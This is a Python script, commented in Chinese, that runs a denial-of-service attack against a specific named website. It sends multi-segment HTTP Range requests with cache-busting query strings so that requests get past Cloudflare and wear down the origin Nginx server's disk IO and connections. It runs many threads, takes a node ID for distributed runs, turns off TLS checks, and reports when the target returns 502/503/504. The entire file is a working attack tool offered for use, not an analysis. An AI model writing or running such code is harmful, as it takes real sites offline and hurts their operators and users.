#!/usr/bin/env python3
"""
Range 多段请求 IO 耗尽攻击
原理: Range: bytes=0-,128-,256-,512-,1024-,... 强制 Nginx 多次磁盘寻址
      + ?r=RANDOM 强制 Cloudflare 缓存未命中回源
      → 1 个请求 = 正常请求 10-100x IO 消耗
      → 少量请求即可耗尽 Nginx worker_connections + 磁盘 IO
"""
import urllib.request, urllib.error
import time, threading, random, os, ssl, uuid

TARGET = "https://www.xnmoe.com"
DURATION = int(os.environ.get("DURATION", "600"))
WORKERS = int(os.environ.get("WORKERS", "20"))
NODE_ID = os.environ.get("NODE_ID", "0")

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

# 目标文件 - 选大文件效果最好
TARGETS = [
    # (路径, 大小估计)
    "/assets/images/banner.jpg",
    "/assets/images/pfp.png",
    "/js/api.js",
    "/js/guestbook-loader.js", 
    "/css/base.css",
    "/css/layout.css",
    "/assets/images/player.png",
    "/assets/images/album_cover.jpg",
    "/css/home.css",
    "/css/guestbook.css",
    "/assets/items/favicon.png",
    "/assets/icons/bilibili.png",
]

# Range 请求头 - 多段 seek (每个seek消耗磁盘IO)
# bytes=起始字节-
RANGES = [
    "bytes=0-,128-,256-,512-,1024-,2048-,4096-",           # 7段seek
    "bytes=0-,1024-,2048-,4096-,8192-,16384-",              # 6段seek
    "bytes=64-,128-,256-,512-,1024-,2048-,4096-,8192-",     # 8段seek
]

stats = {"requests": 0, "ok": 0, "err": 0, "timeout": 0, "502": 0, "503": 0, "504": 0}
lock = threading.Lock()
running = True
frontend_down = False


def range_worker(wid):
    """Worker: 发 Range 多段请求"""
    global frontend_down
    while running:
        target = random.choice(TARGETS)
        range_hdr = random.choice(RANGES)
        # 随机参数绕过 Cloudflare 缓存
        url = f"{TARGET}{target}?_r={uuid.uuid4().hex[:12]}"
        
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": f"Mozilla/5.0 EX-{NODE_ID}-{wid}",
                "Range": range_hdr,
                "Cache-Control": "no-cache",
            })
            resp = urllib.request.urlopen(req, timeout=15, context=ssl_ctx)
            code = resp.status
            resp.read()
            with lock:
                stats["requests"] += 1
                if code in (206, 200):
                    stats["ok"] += 1
                else:
                    stats["err"] += 1
                if code in (502, 503, 504):
                    stats[str(code)] += 1
                    frontend_down = True
                    print(f"\n  *** FRONTEND DOWN! HTTP {code} ***\n", flush=True)
        except urllib.error.HTTPError as e:
            code = e.code
            with lock:
                stats["requests"] += 1
                stats["err"] += 1
                if code in (502, 503, 504):
                    stats[str(code)] += 1
                    frontend_down = True
                    print(f"\n  *** FRONTEND DOWN! HTTP {code} ***\n", flush=True)
        except Exception:
            with lock:
                stats["requests"] += 1
                stats["timeout"] += 1
        time.sleep(0.1)


def static_check_worker(wid):
    """Worker: 检查静态页面是否可访问"""
    global frontend_down
    while running:
        pages = ["/", "/guestbook.html", "/about.html"]
        page = random.choice(pages)
        url = f"{TARGET}{page}?_chk={uuid.uuid4().hex[:6]}"
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": f"Mozilla/5.0 CHK-{NODE_ID}-{wid}",
            })
            resp = urllib.request.urlopen(req, timeout=10, context=ssl_ctx)
            code = resp.status
            resp.read()
            with lock:
                if code in (502, 503, 504):
                    frontend_down = True
                    stats[str(code)] = stats.get(str(code), 0) + 1
                    print(f"\n  *** FRONTEND DOWN! {page} -> HTTP {code} ***\n", flush=True)
        except urllib.error.HTTPError as e:
            if e.code in (502, 503, 504):
                with lock:
                    frontend_down = True
                    stats[str(e.code)] = stats.get(str(e.code), 0) + 1
                print(f"\n  *** FRONTEND DOWN! {page} -> HTTP {e.code} ***\n", flush=True)
        except:
            pass
        time.sleep(2)


def monitor():
    """状态监控"""
    t0 = time.time()
    while running:
        time.sleep(15)
        with lock:
            r = stats["requests"]
            ok = stats["ok"]
            e = stats["err"]
            to = stats["timeout"]
            e502 = stats.get("502", 0)
            e503 = stats.get("503", 0)
            e504 = stats.get("504", 0)
        elapsed = time.time() - t0
        status = "DOWN" if frontend_down else "UP"
        print(f"  [{time.strftime('%H:%M:%S')}] {elapsed:.0f}s | "
              f"Frontend: {status} | "
              f"Req:{r}({r/elapsed*60 if elapsed>0 else 0:.0f}/min) | "
              f"OK:{ok} ERR:{e} TO:{to} | "
              f"502:{e502} 503:{e503} 504:{e504}",
              flush=True)


def main():
    global running
    print(f"\n{'='*65}")
    print(f" RANGE IO EXHAUSTION ATTACK")
    print(f" Node: {NODE_ID} | Workers: {WORKERS}")
    print(f" Duration: {DURATION}s | Targets: {len(TARGETS)} files")
    print(f" Strategy: Multi-range byte seeks + cache busting")
    print(f"{'='*65}\n")

    threading.Thread(target=monitor, daemon=True).start()

    # 大多数 worker 做 Range IO 耗尽
    range_count = max(1, WORKERS - 2)
    for i in range(range_count):
        threading.Thread(target=range_worker, args=(i,), daemon=True).start()
    # 少量 worker 做静态页面监控
    for i in range(WORKERS - range_count):
        threading.Thread(target=static_check_worker, args=(i,), daemon=True).start()

    time.sleep(DURATION)
    running = False
    time.sleep(3)

    with lock:
        r, ok, e, to = stats["requests"], stats["ok"], stats["err"], stats["timeout"]
        e502, e503, e504 = stats.get("502", 0), stats.get("503", 0), stats.get("504", 0)
    print(f"\n{'='*65}")
    print(f" FINAL: Req:{r} OK:{ok} ERR:{e} TO:{to}")
    print(f" 5xx: 502:{e502} 503:{e503} 504:{e504}")
    print(f" Frontend DOWN: {frontend_down}")
    print(f"{'='*65}\n")


if __name__ == "__main__":
    main()
